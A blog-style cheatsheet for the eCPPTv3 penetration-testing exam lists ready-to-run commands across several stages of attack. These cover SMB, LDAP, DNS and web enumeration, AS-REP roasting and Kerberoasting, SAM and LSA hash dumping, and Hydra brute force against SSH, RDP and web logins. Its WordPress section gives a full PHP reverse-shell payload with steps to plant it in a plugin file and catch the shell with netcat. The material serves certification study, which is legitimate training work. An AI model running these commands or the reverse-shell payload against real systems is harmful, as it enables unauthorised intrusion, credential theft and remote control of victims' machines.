---
id: "ine-ecpptv3-cheatsheet"
title: "eCPPTv3 Cheatsheet"
author: "mario-ramos-salson"
publishedDate: 2026-03-24
updatedDate: 2026-03-24
image: ""
description: "A focused eCPPTv3 cheatsheet covering port enumeration, Active Directory attacks, hash dumping, and brute force techniques"
categories:
  - "certifications"
draft: false
featured: false
lang: "en"
---

Heyyy, how's it going? I assume you got to this cheatsheet from my eCPPTv3 review. If not, go take a look ;)

The purpose of this cheatsheet is to help in case someone gets stuck on a port or service and can come here to check new commands they might not have known, helping both to pass the exam and to learn new things or techniques.

The structure of this cheatsheet is as follows:

- [Port / Service Enumeration](#port--service-enumeration)
- [Domain User Enumeration](#domain-user-enumeration)
- [AS-REP Roast Attack](#as-rep-roast-attack)
- [Kerberoasting Attack](#kerberoasting-attack)
- [Hash Dump](#hash-dump)
- [Content Management Systems](#content-management-systems)
- [Brute Force](#brute-force)

As you can see, this is not a generic cheatsheet, but one that is focused on this specific exam.

In fact, it is clear that most of the content is related to AD, since it is almost 80% of the exam. That is why I put a lot of emphasis on getting users, AD attacks like Kerberoasting or AS-REP Roasting, or dumping hashes for privilege escalation or lateral movement.

I hope this helps and gets you out of a tough spot, or helps you learn something new :)

And if you think something is missing or want to contribute, feel free to contact me. Big hug!

## Port / Service Enumeration

### SMB - PORT 445

**NMAP**

```bash
nmap -p445 --script=smb-vuln-* 10.10.10.10

nmap -p 445 --script smb-protocols 10.10.10.10
nmap -p 445 --script smb-security-mode 10.10.10.10

nmap -p 445 --script smb-os-discovery 10.10.10.10

nmap -p 445 --script smb-enum-sessions 10.10.10.10
nmap -p 445 --script smb-enum-sessions --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-shares 10.10.10.10
nmap -p 445 --script smb-enum-shares --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-users --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-groups--script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-domains--script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-server-stats --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-services --script-args smbusername=USER,smbpassword=PASS 10.10.10.10

nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=USER,smbpassword=PASS 10.10.10.10
```

**SMBMap**

```bash
smbmap -H 10.10.10.10

smbmap -u guest -H 10.10.10.10

smbmap -u NOEXIST -H 10.10.10.10

smbmap -u USER -p "PASS" -H 10.10.10.10

smbmap -u USER -p "PASS" -H 10.10.10.10 -x 'id'
```

**SMBCLIENT**

```bash
smbclient -L 10.10.10.10 -N
smbclient -L 10.10.10.10 -U USER
smbclient //10.10.10.10/SHARE -U USER
```

**enum4linux**

```bash
enum4linux -o 10.10.10.10
enum4linux -U 10.10.10.10
enum4linux -S 10.10.10.10
enum4linux -G 10.10.10.10
enum4linux -i 10.10.10.10
enum4linux -r -u USER -p "PASS" 10.10.10.10
enum4linux -a -u USER -p "PASS" 10.10.10.10
enum4linux -U -M -S -P -G 10.10.10.10
```

Flags:
- `-o`: gets remote OS information.
- `-U`: enumerates users.
- `-S`: enumerates shares.
- `-G`: enumerates groups.
- `-i`: enumerates printers.
- `-r`: gets information via RID cycling enumeration.
- `-u`: user for authentication.
- `-p`: password for authentication.
- `-a`: runs a wide enumeration (equivalent to "all").
- `-M`: enumerates machine information in the domain/workgroup.
- `-P`: gets password policy information.

### WinRM - PORT 5985/5986

```bash
evil-winrm -i 10.10.10.10 -u 'USER' -p 'PASSWORD'
```

### FTP - PORT 21

**NMAP**

```bash
nmap -p21 --script=ftp-anon 10.10.10.10
nmap -p21 --script=ftp-bounce 10.10.10.10
nmap -p21 --script=ftp-syst 10.10.10.10
nmap -p21 --script=ftp-vsftpd-backdoor 10.10.10.10
nmap -p21 --script=ftp-* 10.10.10.10
```

**FTP Client**

```bash
ftp 10.10.10.10

# Anonymous user
ftp anonymous@10.10.10.10
```

### SSH - PORT 22

**NMAP**

```bash
nmap -p22 --script=ssh-auth-methods 10.10.10.10
nmap -p22 --script=ssh-hostkey 10.10.10.10
nmap -p22 --script=ssh-publickey-acceptance 10.10.10.10
nmap -p22 --script=sshv1 10.10.10.10
```

**SSH**

```bash
ssh user@10.10.10.10

# With private key
ssh -i id_rsa user@10.10.10.10

# Specify encryption algorithm
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@10.10.10.10
```

### DNS - PORT 53

**DIG**

```bash
dig @10.10.10.10 domain.local

# Zone transfer
dig @10.10.10.10 domain.local AXFR

# Reverse lookup
dig @10.10.10.10 -x 10.10.10.10
```

**NSLOOKUP**

```bash
nslookup domain.local 10.10.10.10

# Zone transfer
nslookup
> server 10.10.10.10
> set type=any
> ls -d domain.local
```

**DNSRecon**

```bash
dnsrecon -d domain.local -n 10.10.10.10

# Zone transfer
dnsrecon -d domain.local -n 10.10.10.10 -t axfr

# Subdomain brute force
dnsrecon -d domain.local -n 10.10.10.10 -D /usr/share/wordlists/subdomains.txt -t brt
```

### HTTP/HTTPS - PORT 80/443

**NMAP**

```bash
nmap -p80,443 --script=http-enum 10.10.10.10
nmap -p80,443 --script=http-headers 10.10.10.10
nmap -p80,443 --script=http-methods 10.10.10.10
nmap -p80,443 --script=http-webdav-scan 10.10.10.10
nmap -p80,443 --script=http-shellshock 10.10.10.10
nmap -p80,443 --script=http-title 10.10.10.10
```

**Whatweb**

```bash
whatweb http://10.10.10.10
whatweb https://10.10.10.10 -v
```

**Nikto**

```bash
nikto -h http://10.10.10.10
nikto -h https://10.10.10.10 -ssl
```

**Gobuster**

```bash
# Directory enumeration
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
gobuster vhost -u http://domain.local -w /usr/share/wordlists/subdomains.txt

# With extensions
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
```

**Feroxbuster**

```bash
feroxbuster -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

# With extensions and recursive
feroxbuster -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -r
```

**FFUF**

```bash
# Directory enumeration
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
ffuf -u http://FUZZ.domain.local -w /usr/share/wordlists/subdomains.txt -H "Host: FUZZ.domain.local"

# GET parameter fuzzing
ffuf -u http://10.10.10.10/page?FUZZ=value -w /usr/share/wordlists/parameters.txt
```

### RPC - PORT 135

**RPCClient**

```bash
rpcclient -U "" -N 10.10.10.10

rpcclient -U "USER%PASSWORD" 10.10.10.10

# Useful commands inside rpcclient:
# enumdomusers - enumerate domain users
# enumdomgroups - enumerate domain groups
# queryuser <RID> - info about a specific user
# querygroupmem <RID> - members of a group
```

**NMAP**

```bash
nmap -p135 --script=msrpc-enum 10.10.10.10
```

### LDAP - PORT 389/636

**NMAP**

```bash
nmap -p389 --script=ldap-rootdse 10.10.10.10
nmap -p389 --script=ldap-search 10.10.10.10
nmap -p389,636 --script=ldap-brute 10.10.10.10
```

### MSSQL - PORT 1433

**NMAP**

```bash
nmap -p1433 --script=ms-sql-info 10.10.10.10
nmap -p1433 --script=ms-sql-brute 10.10.10.10
nmap -p1433 --script=ms-sql-ntlm-info 10.10.10.10
nmap -p1433 --script=ms-sql-empty-password 10.10.10.10
nmap -p1433 --script=ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=password 10.10.10.10
```

**Impacket-mssqlclient**

```bash
impacket-mssqlclient USER:PASSWORD@10.10.10.10

# With Windows authentication
impacket-mssqlclient domain.local/USER:PASSWORD@10.10.10.10 -windows-auth

# Useful commands inside mssqlclient:
# enable_xp_cmdshell
# xp_cmdshell whoami
```

### MySQL - PORT 3306

**NMAP**

```bash
nmap -p3306 --script=mysql-info 10.10.10.10
nmap -p3306 --script=mysql-brute 10.10.10.10
nmap -p3306 --script=mysql-empty-password 10.10.10.10
nmap -p3306 --script=mysql-enum 10.10.10.10
nmap -p3306 --script=mysql-databases --script-args mysqluser=root,mysqlpass=password 10.10.10.10
```

**MySQL Client**

```bash
mysql -h 10.10.10.10 -u root -p

mysql -h 10.10.10.10 -u root -ppassword

# Useful commands inside MySQL:
# show databases;
# use database_name;
# show tables;
# select * from users;
```

### RDP - PORT 3389

**NMAP**

```bash
nmap -p3389 --script=rdp-enum-encryption 10.10.10.10
nmap -p3389 --script=rdp-ntlm-info 10.10.10.10
nmap -p3389 --script=rdp-vuln-ms12-020 10.10.10.10
```

**xfreerdp**

```bash
xfreerdp /u:USER /p:PASSWORD /v:10.10.10.10

xfreerdp /u:USER /d:DOMAIN /p:PASSWORD /v:10.10.10.10

# With NTLM hash
xfreerdp /u:USER /pth:NTHASH /v:10.10.10.10
```

**rdesktop**

```bash
rdesktop -u USER -p PASSWORD 10.10.10.10

rdesktop -d DOMAIN -u USER -p PASSWORD 10.10.10.10
```

### PostgreSQL - PORT 5432

**NMAP**

```bash
nmap -p5432 --script=pgsql-brute 10.10.10.10
```

**psql**

```bash
psql -h 10.10.10.10 -U postgres -d postgres

# Useful commands inside psql:
# \l - list databases
# \c database_name - connect to a database
# \dt - list tables
# SELECT * FROM users;
```

---

## Domain User Enumeration

### SMB - PORT 445

```bash
nxc smb 10.10.10.10 -u "" -p "" --users      # User enumeration
nxc smb 10.10.10.10 -u "" -p "" --rid-brute  # User enumeration

nxc smb 10.10.10.10 -u "guest" -p "" --users      # User enumeration with guest
nxc smb 10.10.10.10 -u "guest" -p "" --rid-brute  # User enumeration with guest

nxc smb 10.10.10.10 -u "USER" -p "PASS" --users      # User enumeration with credentials
nxc smb 10.10.10.10 -u "USER" -p "PASS" --rid-brute  # User enumeration with credentials
```

### LDAP - PORT 389/636

```bash
# ldapsearch: user enumeration without credentials
ldapsearch -x -H 'ldap://10.10.10.10' -b "DC=domain,DC=local" "(objectClass=user)" userPrincipalName

# ldapsearch: user enumeration with credentials
ldapsearch -x -H ldap://10.10.10.10 -D "USER@domain.local" -w "PASSWORD" -b "DC=DOMAIN,DC=LOCAL" "(objectClass=user)" userPrincipalName

# ldapsearch: group enumeration with credentials
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=group)" cn member

# LDAPS (636)
ldapsearch -x -H ldaps://10.10.10.10 -D "USER@domain.local" -w "PASSWORD" -b "DC=domain,DC=local"

# netexec ldap: user enumeration with credentials
nxc ldap 10.10.10.10 -u 'USER' -p 'PASSWORD' --query "(objectClass=user)" "userPrincipalName"

```

### RPC - PORT 135

```bash
rpcclient -U "USER%PASSWORD" 10.10.10.102  -c "enumdomusers"
```

### Kerberos -  PORT 88

```bash
# Enumerate users via brute force
kerbrute userenum --dc 10.10.10.10 -d domain.local users.txt
```

## AS-REP Roast Attack

```bash
nxc ldap DC_IP -u domain_users.txt -p '' --asreproast asrep_hashes.txt

impacket-GetNPUsers -no-pass -usersfile domain_users.txt -dc-ip DC_IP -request -format hashcat -outputfile asrep_hashes.txt local.htb/
```

Then crack the hashes:

```bash
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

## Kerberoasting Attack

```bash
impacket-GetUserSPNs -request -dc-ip DC_IP -outputfile kerberoast_hashes.txt "domain.local/USER:PASSWORD"

nxc ldap DC_IP -u "USER" -p "PASSWORD" --kerberoasting kerberoast_hashes.txt
```

Then crack the hashes:

```bash
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

## Hash Dump

### Impacket-SecretsDump

```bash
impacket-secretsdump 'domain.local/USER:PASSWORD'@10.10.10.10

# With NTLM hash
impacket-secretsdump 'domain.local/USER'@10.10.10.10 -hashes :NTHASH

# With Kerberos ticket
KRB5CCNAME=krb5cc impacket-secretsdump -k 'DOMINIO/user@IP_OBJETIVO'
```

### Netexec

```bash
# SAM dump
nxc smb 10.10.10.10 -u USER -p 'PASSWORD' -d domain.local --sam
nxc smb 10.10.10.10 -u USER -H 'PASSWORD' --local-auth --sam

# LSASS dump
nxc smb 10.10.10.10 -d DOMINIO -u USER -p 'PASSWORD' --lsa
nxc smb 10.10.10.10 -d DOMINIO -u USER -H 'NTHASH' --lsa
```

## Content Management Systems

### WordPress

Among the most interesting files we can find in a WordPress are:

- ``/wp-admin/login.php``
- ``/wp-admin/wp-login.php``
- ``/login.php``
- ``/wp-login.php``

**wpscan**

```bash
wpscan --url "https://10.10.10.10" -e t  # Installed themes
wpscan --url "https://10.10.10.10" -e vt # Installed vulnerable themes

wpscan --url "https://10.10.10.10"  -e p  # Installed plugins
wpscan --url "https://10.10.10.10"  -e vp # Installed vulnerable plugins

wpscan --url "https://10.10.10.10"  -e u       # WordPress users
wpscan --url 10.10.10.10 --usernames users.txt # WordPress users

wpscan --url "https://10.10.10.10" --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 10
```

If we are able to access the WordPress admin panel, getting an interactive shell on the victim is very easy.

1. Go to Plugins and click Plugin File Editor.
2. Look for a `.php` file you want to edit.

For simplicity, we can use the main plugin file, which is always named the same: `PLUGIN.php`.

Once you are in that file, go all the way to the end and add the following block of code:

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';   // CHANGE
$port = 4444;        // CHANGE
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


if (function_exists('pcntl_fork')) {
  $pid = pcntl_fork();
  
  if ($pid == -1) {
    printit("ERROR: Can't fork");
    exit(1);
  }
  
  if ($pid) {
    exit(0);
  }

  if (posix_setsid() == -1) {
    printit("Error: Can't setsid()");
    exit(1);
  }

  $daemon = 1;
} else {
  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}


chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
  printit("$errstr ($errno)");
  exit(1);
}


$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w") 
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
  if (feof($sock)) {
    printit("ERROR: Shell connection terminated");
    break;
  }


  if (feof($pipes[1])) {
    printit("ERROR: Shell process terminated");
    break;
  }


  $read_a = array($sock, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);


  if (in_array($sock, $read_a)) {
    if ($debug) printit("SOCK READ");
    $input = fread($sock, $chunk_size);
    if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);
  }


  if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug) printit("STDOUT: $input");
    fwrite($sock, $input);
  }


  if (in_array($pipes[2], $read_a)) {
    if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");
    fwrite($sock, $input);
  }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);


function printit ($string) {
  if (!$daemon) {
    print "$string\n";
  }
}
```

But before saving this payload in the plugin, we need to start a listener to receive the reverse shell.

```bash
nc -lvnp 4444
```

Now you can save it and you will get a shell on the victim.

Once we get it, we can fix the TTY to work more comfortably in the system.

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo;fg
reset xterm
export SHELL=/bin/bash
export TERM=xterm-256color
source /etc/skel/.bashrc
```

## Brute Force

### SSH - PORT 22

```bash
hydra -l USER -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -V
```

### FTP - PORT 21

```bash
hydra -l USER -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

hydra -l anonymous -P passwords.txt ftp://10.10.10.10
```

### SMB - PORT 445

```bash
hydra -l USER -P /usr/share/wordlists/rockyou.txt smb://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.10.10

hydra -L users.txt -P passwords.txt smb://10.10.10.10 -t 1 -V
```

### RDP - PORT 3389

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10

hydra -L users.txt -P passwords.txt rdp://10.10.10.10 -V
```

### WinRM - PORT 5985/5986

```bash
hydra -l USER -P /usr/share/wordlists/rockyou.txt winrm://10.10.10.10

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt winrm://10.10.10.10

hydra -L users.txt -P passwords.txt winrm://10.10.10.10 -t 4 -V
```

### HTTP/HTTPS - PORT 80/443

```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V

# HTTP GET form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-get-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-get /admin

# HTTPS with POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 https-post-form "/login:username=^USER^&password=^PASS^:F=Login failed" -V
```

**Useful Hydra flags:**
- `-l USER`: specify a single user.
- `-L users.txt`: specify a file with multiple users.
- `-p PASS`: specify a single password.
- `-P passwords.txt`: specify a file with multiple passwords.
- `-t N`: number of parallel tasks/threads (default: 16).
- `-V` or `-vV`: verbose mode to see each attempt.
- `-f`: stop when a valid credential is found.
- `-s PORT`: specify a custom port if it is not the default.